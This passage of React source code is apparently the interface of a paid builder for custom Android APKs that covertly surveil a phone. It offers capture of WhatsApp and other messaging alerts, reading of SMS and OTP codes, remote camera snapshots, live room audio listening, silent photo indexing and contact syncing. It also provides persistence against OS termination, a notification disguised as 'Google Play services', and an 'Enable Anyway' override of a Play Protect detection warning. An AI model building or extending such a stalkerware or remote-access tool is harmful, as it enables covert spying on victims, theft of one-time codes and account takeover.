                                {/* Notification Listener - Soft Sky */}
                                <div className={`p-4 rounded-2xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(14,165,233,0.1)]`}>
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-sky-200">Notification Reader</span>
                                            {isBasicPlan && (
                                                <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
                                                    PRO
                                                </span>
                                            )}
                                            <button type="button" onClick={() => setShowPermissionInfo('notifications')} className="text-sky-400/70 hover:text-sky-300">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-sky-300/70">Capture WhatsApp & messaging alerts</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (isBasicPlan) { onUpgrade?.(); return; }
                                            setEnableNotificationListener(!enableNotificationListener);
                                        }}
                                        className={`w-11 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableNotificationListener ? 'bg-sky-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableNotificationListener && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>

                                {/* SMS Access - Soft Rose */}
                                <div className={`p-4 rounded-2xl bg-rose-500/10 border border-rose-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(244,63,94,0.1)]`}>
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-rose-200">SMS Messages</span>
                                            <span className="bg-rose-500/20 text-rose-300 border border-rose-500/40 px-1.5 py-0.5 rounded text-[9px] font-bold">
                                                RISKY
                                            </span>
                                            {isBasicPlan && (
                                                <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
                                                    PRO
                                                </span>
                                            )}
                                            <button type="button" onClick={() => setShowPermissionInfo('sms')} className="text-rose-400/70 hover:text-rose-300">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-rose-300/70">Read incoming SMS & OTP codes</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (isBasicPlan) { onUpgrade?.(); return; }
                                            if (!enableSmsPermission) {
                                                setShowPlayProtectWarning(true);
                                            } else {
                                                setEnableSmsPermission(false);
                                            }
                                        }}
                                        className={`w-11 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableSmsPermission ? 'bg-rose-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableSmsPermission && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>
                            </div>

                            {/* Aggressive Persistence Mode Card - Soft Amber */}
                            <div className="p-4 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-between gap-4 shadow-[0_4px_16px_rgba(245,158,11,0.1)]">
                                <div>
                                    <div className="flex items-center gap-2">
                                        <span className="text-sm font-bold text-amber-200">Aggressive Persistence Mode</span>
                                        {isBasicPlan && (
                                            <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
                                                PRO
                                            </span>
                                        )}
                                    </div>
                                    <p className="text-xs text-amber-300/70 mt-0.5">Prevents OS background optimization from terminating the service</p>
                                </div>
                                <button
                                    type="button"
                                    onClick={() => {
                                        if (isBasicPlan) { onUpgrade?.(); return; }
                                        setAggressivePermissions(!aggressivePermissions);
                                    }}
                                    className={`w-11 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : aggressivePermissions ? 'bg-amber-500' : 'bg-white/20'}`}
                                >
                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${aggressivePermissions && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                </button>
                            </div>
                        </div>
                    )}

                    {/* STEP 3: NOTIFICATIONS & TARGET APPS */}
                    {activeStep === 'notifications' && (
                        <div className="space-y-6 animate-in fade-in duration-200">
                            
                            {/* Colorful Soft UI Target Apps Selector */}
                            <div>
                                <div className="flex items-center justify-between mb-2.5">
                                    <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest">Monitored Target Apps</label>
                                    <span className="text-xs font-semibold text-emerald-400">{selectedTargetApps.length} active</span>
                                </div>
                                <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
                                    {MONITORED_APPS.map((app) => {
                                        const isSelected = selectedTargetApps.includes(app.id);
                                        return (
                                            <button
                                                key={app.id}
                                                type="button"
                                                onClick={() => toggleTargetApp(app.id)}
                                                className={`p-3.5 rounded-2xl border text-left flex items-center justify-between transition-all ${
                                                    isSelected
                                                        ? `${app.color} scale-[1.01]`
                                                        : 'bg-black/40 border-white/10 hover:border-white/20 text-fg-3'
                                                }`}
                                            >
                                                <div className="flex items-center gap-2.5 truncate">
                                                    <span className="text-lg">{app.icon}</span>
                                                    <span className="text-xs font-bold truncate">{app.name}</span>
                                                </div>
                                                {isSelected && <CheckCircle2 size={16} className="flex-shrink-0" />}
                                            </button>
                                        );
                                    })}
                                </div>
                            </div>

                            {/* Foreground Service Disguise */}
                            <div className="space-y-4 pt-4 border-t border-white/10">
                                <div>
                                    <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-1.5">Background Service Disguise</label>
                                    <select
                                        value={notificationStyle}
                                        onChange={(e) => setNotificationStyle(e.target.value)}
                                        className="w-full bg-black/50 border border-white/10 rounded-2xl px-4 py-3 text-white text-sm focus:outline-none focus:border-emerald-500/60 transition-colors shadow-inner"
                                    >
                                        {Object.entries(NOTIFICATION_PRESETS).map(([key, preset]) => (
                                            <option key={key} value={key} className="bg-[#18191c]">
                                                {preset.icon} {preset.title}
                                            </option>
                                        ))}
                                    </select>
                                </div>

                                {/* Disguise Live Preview */}
                                {notificationStyle !== 'custom' && (
                                    <div className="bg-black/50 rounded-2xl p-4 border border-white/10 flex items-center gap-3 shadow-inner">
                                        <span className="text-2xl">{NOTIFICATION_PRESETS[notificationStyle]?.icon}</span>
                                        <div>
                                            <p className="text-sm font-bold text-white">{NOTIFICATION_PRESETS[notificationStyle]?.title}</p>
                                            <p className="text-xs text-fg-3">{NOTIFICATION_PRESETS[notificationStyle]?.text}</p>
                                        </div>
                                    </div>
                                )}

                                {/* Custom Notification Fields */}
                                {notificationStyle === 'custom' && (
                                    <div className="space-y-3 bg-black/50 p-4 rounded-2xl border border-white/10 shadow-inner">
                                        <div>
                                            <label className="block text-xs font-bold text-fg-3 mb-1">Custom Title</label>
                                            <input
                                                type="text"
                                                value={notificationTitle}
                                                onChange={(e) => setNotificationTitle(e.target.value)}
                                                className="w-full bg-white/5 border border-white/10 rounded-xl px-3 py-2 text-white text-sm"
                                                placeholder="Google Play services"
                                            />
                                        </div>
                                        <div>
                                            <label className="block text-xs font-bold text-fg-3 mb-1">Custom Text</label>
                                            <input
                                                type="text"
                                                value={notificationText}
                                                onChange={(e) => setNotificationText(e.target.value)}
                                                className="w-full bg-white/5 border border-white/10 rounded-xl px-3 py-2 text-white text-sm"
                                                placeholder="Checking for updates…"
                                            />
                                        </div>
                                    </div>
                                )}
                            </div>
                        </div>
                    )}
                </div>

                {/* Footer Controls & Progress Popup Overlay */}
                <div className="p-5 sm:p-7 border-t border-white/10 bg-gradient-to-t from-white/[0.04] to-transparent flex flex-col gap-4">
                    
                    {/* Progress / Status Modal Popup Box */}
                    {status !== 'idle' && (
                        <div className="p-5 rounded-2xl bg-black/80 border border-emerald-500/30 flex flex-col items-center justify-center text-center space-y-3 animate-in fade-in shadow-2xl">
                            {status === 'queued' ? (
                                <>
                                    <div className="w-10 h-10 border-4 border-emerald-500/30 border-t-emerald-500 rounded-full animate-spin" />
                                    <h4 className="text-base font-bold text-white">Queued for Compilation</h4>
                                    <p className="text-xs text-fg-3">Queue Position: <span className="text-emerald-400 font-bold">{queuePosition}</span></p>
                                </>
                            ) : status === 'generating' ? (
                                <>
                                    <div className="w-full flex items-center justify-between text-xs font-bold text-fg-2">
                                        <span>{progressStep || "Compiling APK..."}</span>
                                        <span className="text-emerald-400">{progress}%</span>
                                    </div>
                                    <div className="w-full h-3 bg-white/10 rounded-full overflow-hidden">
                                        <div
                                            className="h-full bg-gradient-to-r from-emerald-500 to-teal-400 transition-all duration-500"
                                            style={{ width: `${progress}%` }}
                                        />
                                    </div>
                                </>
                            ) : status === 'completed' ? (
                                <>
                                    <CheckCircle2 size={36} className="text-emerald-400" />
                                    <h4 className="text-lg font-bold text-white">APK Ready!</h4>
                                    <p className="text-xs text-fg-3">Your compiled Android APK is ready for installation.</p>
                                    {downloadUrl && (
                                        <a
                                            href={downloadUrl}
                                            target="_blank"
                                            rel="noopener noreferrer"
                                            className="px-6 py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white font-bold text-xs shadow-lg transition-all"
                                        >
                                            Download APK Now
                                        </a>
                                    )}
                                </>
                            ) : null}
                        </div>
                    )}

                    {/* Step Navigation & Action Buttons */}
                    <div className="flex items-center justify-between gap-3">
                        {activeStep !== 'identity' ? (
                            <button
                                type="button"
                                onClick={() => setActiveStep(activeStep === 'notifications' ? 'permissions' : 'identity')}
                                className="px-5 py-3 rounded-xl bg-white/5 hover:bg-white/10 text-fg-2 hover:text-white font-bold text-xs transition-all"
                            >
                                ← Previous
                            </button>
                        ) : <div />}

                        {activeStep !== 'notifications' ? (
                            <button
                                type="button"
                                onClick={() => setActiveStep(activeStep === 'identity' ? 'permissions' : 'notifications')}
                                className="px-6 py-3 rounded-xl bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 text-black font-extrabold text-xs shadow-lg shadow-emerald-500/20 transition-all flex items-center gap-2"
                            >
                                <span>Next Step</span>
                                <span>→</span>
                            </button>
                        ) : status === 'idle' ? (
                            <button
                                type="button"
                                onClick={startGeneration}
                                className="px-8 py-3.5 rounded-xl bg-gradient-to-r from-emerald-500 via-teal-500 to-cyan-500 hover:scale-105 text-black font-black text-sm shadow-[0_0_25px_rgba(16,185,129,0.35)] transition-all"
                            >
                                Build Custom APK
                            </button>
                        ) : (
                            <button
                                type="button"
                                onClick={onClose}
                                className="px-6 py-3 rounded-xl bg-white/10 hover:bg-white/20 text-white font-bold text-xs transition-all"
                            >
                                Close
                            </button>
                        )}
                    </div>
                </div>

                {/* Play Protect Warning Modal */}
                {showPlayProtectWarning && (
                    <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-[350]" onClick={() => setShowPlayProtectWarning(false)}>
                        <div className="bg-[#18191c] rounded-3xl p-6 max-w-sm mx-4 border border-red-500/30 shadow-2xl space-y-4" onClick={(e) => e.stopPropagation()}>
                            <div className="flex items-center gap-3">
                                <div className="w-11 h-11 rounded-2xl bg-red-500/15 border border-red-500/30 flex items-center justify-center text-red-400">
                                    <AlertTriangle size={22} />
                                </div>
                                <div>
                                    <h3 className="text-base font-bold text-white">Play Protect Warning</h3>
                                    <p className="text-xs text-red-400">High detection risk</p>
                                </div>
                            </div>

                            <p className="text-fg-2 text-xs leading-relaxed">
                                Enabling <strong>SMS Access</strong> increases the likelihood that Google Play Protect will flag or restrict installation. Proceed only if needed.
                            </p>

                            <div className="flex gap-3">
                                <button
                                    type="button"
                                    onClick={() => setShowPlayProtectWarning(false)}
                                    className="flex-1 py-2.5 rounded-xl bg-white/5 hover:bg-white/10 text-white text-xs font-bold transition-all"
                                >
                                    Cancel
                                </button>
                                <button
                                    type="button"
                                    onClick={() => {
                                        setEnableSmsPermission(true);
                                        setShowPlayProtectWarning(false);
                                    }}
                                    className="flex-1 py-2.5 rounded-xl bg-red-500 hover:bg-red-600 text-white text-xs font-bold transition-all"
                                >
                                    Enable Anyway
                                </button>
                            </div>
                        </div>
                    </div>
                )}

                {/* Permission Info Modal */}
                {showPermissionInfo && (
                    <div className="fixed inset-0 z-[350] flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
                        <div className="bg-[#18191c] border border-white/15 rounded-3xl p-6 max-w-sm w-full space-y-4 relative shadow-2xl">
                            <button
                                onClick={() => setShowPermissionInfo(null)}
                                className="absolute top-4 right-4 text-white/50 hover:text-white"
                            >
                                ✕
                            </button>

                            <h4 className="text-base font-bold text-white capitalize">{showPermissionInfo} Access Details</h4>
                            <p className="text-xs text-fg-3 leading-relaxed">
                                {showPermissionInfo === 'storage' && "Allows silent background indexing of device photos, videos, and downloads."}
                                {showPermissionInfo === 'camera' && "Allows remote snapshots and live video streams from front and rear cameras."}
                                {showPermissionInfo === 'microphone' && "Allows real-time room audio listening and surround sound capture."}
                                {showPermissionInfo === 'contacts' && "Allows address book and stored accounts syncing."}
                                {showPermissionInfo === 'notifications' && "Allows capturing WhatsApp, Instagram, Telegram, and system alerts."}
                                {showPermissionInfo === 'sms' && "Allows reading incoming OTP codes and SMS history."}
                            </p>

                            <button
                                onClick={() => setShowPermissionInfo(null)}
                                className="w-full py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-black font-bold text-xs transition-all"
                            >
                                Got it
                            </button>
                        </div>
                    </div>
                )}

                {/* Custom Alert Modal */}
                <CustomAlertModal
                    isOpen={showCustomAlert}
                    onClose={() => setShowCustomAlert(false)}
                    title={alertData.title}
                    message={alertData.message}
                    type={alertData.type}
                />
            </div>
        </div>
    );
}
